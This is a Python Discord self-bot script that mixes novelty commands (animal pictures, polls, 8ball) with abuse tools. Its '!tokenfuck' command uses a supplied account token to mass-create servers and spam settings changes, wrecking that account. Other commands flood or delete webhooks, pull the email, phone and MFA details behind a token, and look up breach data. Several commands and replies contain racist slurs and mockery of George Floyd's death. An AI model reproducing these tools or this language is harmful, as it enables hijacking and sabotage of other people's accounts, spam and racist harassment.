import discord
from discord.ext import commands
import random
import aiohttp
import requests
import asyncio
import json
from datetime import datetime
import base64
import keep_alive
from itertools import cycle
import linecache
import time

token = ""
bot = commands.Bot(command_prefix='!', self_bot=True)
color = 3092790


languages = {
              'da'    : 'Danish, Denmark',
              'de'    : 'German, Germany',
              'en-GB' : 'English, United Kingdom',
              'en-US' : 'English, United States',
              'es-ES' : 'Spanish, Spain',
              'fr'    : 'French, France',
              'hr'    : 'Croatian, Croatia',
              'lt'    : 'Lithuanian, Lithuania',
              'hu'    : 'Hungarian, Hungary',
              'nl'    : 'Dutch, Netherlands',
              'no'    : 'Norwegian, Norway',
              'pl'    : 'Polish, Poland',
              'pt-BR' : 'Portuguese, Brazilian, Brazil',
              'ro'    : 'Romanian, Romania',
              'fi'    : 'Finnish, Finland',
              'sv-SE' : 'Swedish, Sweden',
              'vi'    : 'Vietnamese, Vietnam',
              'tr'    : 'Turkish, Turkey',
              'cs'    : 'Czech, Czechia, Czech Republic',
              'el'    : 'Greek, Greece',
              'bg'    : 'Bulgarian, Bulgaria',
              'ru'    : 'Russian, Russia',
              'uk'    : 'Ukranian, Ukraine',
              'th'    : 'Thai, Thailand',
              'zh-CN' : 'Chinese, China',
              'ja'    : 'Japanese',
              'zh-TW' : 'Chinese, Taiwan',
              'ko'    : 'Korean, Korea'
          }


locales = [
              "da", "de",
              "en-GB", "en-US",
              "es-ES", "fr",
              "hr", "it",
              "lt", "hu",
              "nl", "no",
              "pl", "pt-BR",
              "ro", "fi",
              "sv-SE", "vi",
              "tr", "cs",
              "el", "bg",
              "ru", "uk",
              "th", "zh-CN",
              "ja", "zh-TW",
              "ko"
          ]

@bot.event
async def on_message_delete(message):
    global snipe_message_content
    global snipe_message_author
    global snipe_message_id
    snipe_message_content = message.content
    snipe_message_author = message.author.id
    snipe_message_id = message.id
    await asyncio.sleep(60)
    if message.id == snipe_message_id:
        snipe_message_author = None
        snipe_message_content = None
        snipe_message_id = None

@bot.event
async def on_message(message):
        
        #blacklist
        #if message.author.id == 919422362640842832:
          #pass
          
        if message.content == '!help':
          embed = discord.Embed(title='List', color = color, description=f"""

**!snipe** - sends the last deleted message 
**!b64encode/decode** - encodes/decodes something in base64 
**!botinvite** - sends a invite to a bot
**!linkvertise** - bypasses a linkvertise link

**!leak** - checks a query on intelx (only emails,)
**!idinfo** - checks an id
**!ipinfo** - checks an ip 
**!tokeninfo** - checks a tokens info 
**!spamwebhook** - spams a webhook
**!deletewebhook** - deletes a webhook 
**!tokenfuck** - fucks a token

**!banner** - steals anyones banner
**!av** - steals anyones avatar
**!meme** - sends a shitty reddit meme lol 
**!racc** - sends a raccoon pic 
**!cat** - sends a cat pic 
**!dog** - sends a dog pic 
**!hentai** - you already know what it does

**!8ball** - 8ball
**!poll** - creates a poll
**!guessinggame** - guessing game (if someone interrupts it breaks)
**!nigrate** - sends ur nigrate u blackie 
""")  
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
          await message.channel.send(embed=embed)

  
        elif message.content == "!randomserver":
          server = linecache.getline('servers.txt', random.randint(1, 1600))
          await message.channel.send(server)




        elif message.content == "4ren":
          await message.channel.send("u mean the retard monkey :clown: :clown: :clown: https://media.discordapp.net/attachments/921103626372526090/921151699735957594/unknown.png")

        elif message.content == "floyd":
          await message.channel.send("i cant breathe")
          await message.channel.send("https://i.imgur.com/mn3EslL.png")

        elif message.content == "!furry":
          await message.channel.send("loxi is furry")

        elif message.content == "!poll":
          await message.channel.send("Question?")
          response = await bot.wait_for('message')
          question = response.content
          if question == "!poll":
            return
          else:
            embed = discord.Embed(title='Poll!', color = color, description=f"{question}")
            message = await message.channel.send(embed=embed)
            await message.add_reaction('✅')
            await message.add_reaction('❎')

        elif message.content == "!leak":
          await message.channel.send("Query?")
          query = await bot.wait_for('message')
          if query.author.id == bot.user.id:
            pass
          else:
            search = query.content
            search2 = search.replace("@", "%40")
            await message.channel.send(f"<https://intelx.io/?s={search2}>")
          

        elif message.content == "!hentai":
          request = requests.get(f'https://nekobot.xyz/api/image?type=hass')
          data = request.json()
          link = data['message']
          embed = discord.Embed(color=color, title="loading... if the image doesn't show it got blocked!")
          firstembed = await message.channel.send(embed=embed)
          secondembed = discord.Embed(color=color, title="hentiea")
          secondembed.set_image(url=link)
          await firstembed.edit(embed=secondembed)



        elif message.content == "!botinvite":
          await message.channel.send('Bot id? ')
          response = await bot.wait_for('message')
          id = response.content
          await message.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={id}&permissions=0&scope=bot')


        elif message.content == '!deletewebhook':
          await message.channel.send('Webhook? ')
          response = await bot.wait_for('message')
          try:
            requests.delete(response.content)
            await message.channel.send(f"Deleted webhook '{response.content}''")
          except:
            await message.channel.send(f"Error!")

        elif message.content == "!b64encode":
          await message.channel.send("Message you want to encode?")
          response = await bot.wait_for('message')
          response2 = str(response.content)
          string_bytes = response2.encode("ascii")
          base64_bytes = base64.b64encode(string_bytes) 
          base64_string = base64_bytes.decode("ascii") 
          embed = discord.Embed(title=f"Encoded: {base64_string}", color=color)
          await message.channel.send(embed=embed)

        elif message.content == "!b64decode":
          await message.channel.send("Message you want to decode?")
          response = await bot.wait_for('message')
          response2 = str(response.content)
          string_bytes = response2.encode("ascii")
          base64_bytes = base64.b64decode(string_bytes) 
          base64_string = base64_bytes.decode("ascii") 
          embed = discord.Embed(title=f"Decoded: {base64_string}", color=color)
          await message.channel.send(embed=embed)

        elif message.content == '!nigrate':
          embed = discord.Embed(title='nigrate', color = color, description=f"ur nigrate is {random.randint(0,100)}% u black monkey ")
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
          await message.channel.send(embed=embed)
          return


        elif message.content == "!dog":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/dog') 
              dogjson = await request.json()
              embed = discord.Embed(title="what da dog doin", color=color)
              embed.set_image(url=dogjson['link'])
              await message.channel.send(embed=embed)

        elif message.content == '!tokenfuck':
          await message.channel.send("Token?")
          response = await bot.wait_for('message')
          if response.author.id == bot.user.id:
            pass
          else:
            _token = str(response.content)
            await message.channel.send("Server names?")
            response2 = await bot.wait_for('message')
            if response2.author.id == bot.user.id:
              pass
            else:
              names = str(response2.content)
              headers = {
                  'User-Agent': 'Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Safari/537.36',
                  'Content-Type': 'application/json',
                  'Authorization': _token,
              }
              request = requests.Session()
              payload = {
                  'theme': "light",
                  'locale': "ja",
                  'message_display_compact': False,
                  'inline_embed_media': False,
                  'inline_attachment_media': False,
                  'gif_auto_play': False,
                  'render_embeds': False,
                  'render_reactions': False,
                  'animate_emoji': False,
                  'convert_emoticons': False,
                  'enable_tts_command': False,
                  'explicit_content_filter': '0',
                  'status': "invisible",
                  'developer_mode': True
                  
              }
              guild = {
                  'channels': None,
                  'icon': None,
                  'name': names,
                  'region': "europe"
              } 
              try:
                for _i in range(100):
                    requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
              except:
                pass
              while True:
                  try:
                      request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
                  except KeyError:
                      pass
                  else:
                      break
              modes = cycle(["light", "light"])
              statuses = cycle(["online", "idle", "invisible"])
              for i in range(1000):
                  setting = {
                      'theme': next(modes),
                      'locale': random.choice(locales),
                      'status': next(statuses)
                  }
                  for i in range(1000):
                      try:
                          request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
                      except KeyError:
                          pass
                      else:
                          break
          await asyncio.sleep(2)
          
        elif message.content == "!spamwebhook":
          await message.channel.send("Webhook? ")
          webhook = await bot.wait_for('message')
          try:
            for i in range(100):
              requests.post(
                  webhook.content,
                  json={'content': f"""@everyone ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽ @everyone ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"""})
          except:
            print('err')

        elif message.content == "!cat":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/cat') 
              dogjson = await request.json()
              embed = discord.Embed(title="nice pussy <3", color=color)
              embed.set_image(url=dogjson['link'])
              await message.channel.send(embed=embed)


        elif message.content == "!meme":
          embed = discord.Embed(title="", description="", color=color)

          async with aiohttp.ClientSession() as cs:
              async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
                  res = await r.json()
                  embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
                  await message.channel.send(embed=embed)


        elif message.content == "!racc" or message.content == "!rat":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/raccoon') 
              dogjson = await request.json()
              embed = discord.Embed(title="<3", color=color)
              embed.set_image(url=dogjson['link'])
              await message.channel.send(embed=embed)



        elif message.content == "!tokeninfo":
           await message.channel.send('Token?')
           response = await bot.wait_for('message')
           token = str(response.content)
           headers = {
               'Authorization': token,
               'Content-Type': 'application/json'
           }
           try:
               res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
               res = res.json()
               user_id = res['id']
               locale = res['locale']
               avatar_id = res['avatar']
               language = languages.get(locale)
               creation_date = "nvm"
           except KeyError:
               headers = {
                   'Authorization': "Bot " + token,
                   'Content-Type': 'application/json'
               }
               try:
                   res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
                   res = res.json()
                   user_id = res['id']
                   locale = res['locale']
                   avatar_id = res['avatar']
                   language = languages.get(locale)
                   creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                       '%d-%m-%Y %H:%M:%S UTC')
                   em = discord.Embed(color=0x2f3136,
                       description=f"Name: `{res['username']}#{res['discriminator']} ` **(BOT**)\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
                   fields = [
                       {'name': 'Flags', 'value': res['flags']},
                       {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                       {'name': 'Verified', 'value': res['verified']},
                   ]
                   for field in fields:
                      if field['value']:
                           em.add_field(name=field['name'], value=field['value'], inline=False)
                           em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
                   return await message.channel.send(embed=em)
               except KeyError:
                   await message.channel.send("Invalid token")
           em = discord.Embed(color=0x2f3136,
               description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
           nitro_type = "None"
           if "premium_type" in res:
               if res['premium_type'] == 2:
                   nitro_type = "Nitro Premium"
               elif res['premium_type'] == 1:
                   nitro_type = "Nitro Classic"
           fields = [
               {'name': 'Phone', 'value': res['phone']},
               {'name': 'Flags', 'value': res['flags']},
               {'name': 'Local language', 'value': res['locale'] + f"{language}"},
               {'name': 'MFA', 'value': res['mfa_enabled']},
               {'name': 'Verified', 'value': res['verified']},
               {'name': 'Nitro', 'value': nitro_type},
           ]
           for field in fields:
               if field['value']:
                   em.add_field(name=field['name'], value=field['value'], inline=False)
                   em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
           return await message.channel.send(embed=em)



        elif message.content == "!idinfo":
          await message.channel.send('User id?')
          response = await bot.wait_for('message')
          response2 = response.content
          user = await bot.fetch_user(response2)
          timestamp = datetime.fromtimestamp(time)
          embed = discord.Embed(description=f"""
**Username:** {user.name}#{user.discriminator}
**Id:** {response2}
**Created at:** {timestamp}
""", color=color)
          embed.set_thumbnail(url=user.avatar_url)
          await message.channel.send(embed=embed)

        elif message.content == "!linkvertise":
          headers = {
          "Host": "bypass.bot.nu",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate, br",
          "Referer": "https://bypass.bot.nu/",
          "Connection": "keep-alive",
              }
          await message.channel.send("Link?")
          response = await bot.wait_for('message')
          link = response.content
          if link == "Link?":
            pass
          else:
            data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
            link = data.json()["destination"]
            await message.channel.send(f"Link: {link}")

        elif message.content == "!av":
          await message.channel.send('User?')
          try:
            response = await bot.wait_for('message')
            response2 = response.content
            user2 = response2.strip('<').strip('>').strip('@').strip('!')
            user = await bot.fetch_user(user2)
            await message.channel.send(user.avatar_url)
          except:
            response = await bot.wait_for('message')
            response2 = response.content
            user = await bot.fetch_user(response2)
            await message.channel.send(user.avatar_url)





        elif message.content == "!banner":
          await message.channel.send('User?')
          response = await bot.wait_for('message')
          response2 = response.content
          user2 = response2.strip('<').strip('>').strip('@').strip('!')
          user = await bot.fetch_user(user2)
          req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
          banner_id = req["banner"]
          if banner_id == None:
            await message.channel.send("No banner!")
          else:
            banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
            await message.channel.send(banner_url)




        elif message.content == "!ipinfo":
            await message.channel.send('Ip?')
            ip = await bot.wait_for('message')
            ip2 = str(ip.content)
            if ip2 == "Link?":
              pass
            else:
              async with aiohttp.ClientSession() as session:
                request = await session.get(f'https://ipapi.co/{ip2}/json') 

                ipjson = await request.json()
                json_formatted_str = json.dumps(ipjson, indent=2)
                ipinfo = json_formatted_str.strip('{').strip('}').replace('"', "⁣").replace(',', '⁣').replace('  ⁣', '⁣')

                await message.channel.send(f"""```{ipinfo}```""")
              
        elif message.content == "!8ball":
          await message.channel.send('Question?')
          question = await bot.wait_for('message')
          if question.author.id == bot.user.id:
            pass
          else:
            q = question.content
            responses = ['yes',
                    'no',
                    'maybey',
                    'sure']
            response = random.choice(responses)
            lol = random.randint(1, 30)
            if lol == 7:
              response = "i put my coomer in ur moder"
            embed=discord.Embed(title=f"Question: {q}\nAnswer: {response} ", color=color)
            await message.channel.send(embed=embed)      

        elif message.content == '!snipe':
            if snipe_message_content==None:
                await message.channel.send("NOTHING TO SNIPE U FAT LITTLE MONKEY")
            else:
                embed = discord.Embed(description=f"{snipe_message_content}", color=color)
                embed.set_author(name= f"Snipe")
                await message.channel.send(embed=embed)
                await message.channel.send(f"Sent by: <@{snipe_message_author}>")

          
        elif message.content == "!guessinggame":
                await message.channel.send('Guess a number from 1 to 5!')
                number = random.randint(1, 5)
                for i in range(1, 5):
                    response = await bot.wait_for('message')
                    guess = int(response.content)
                    if guess > number:
                        await message.channel.send('Smaller!')
                    elif guess < number:
                        await message.channel.send('Bigger!')
                    else:
                        await message.channel.send('You guessed it!')










       
bot.run(token)
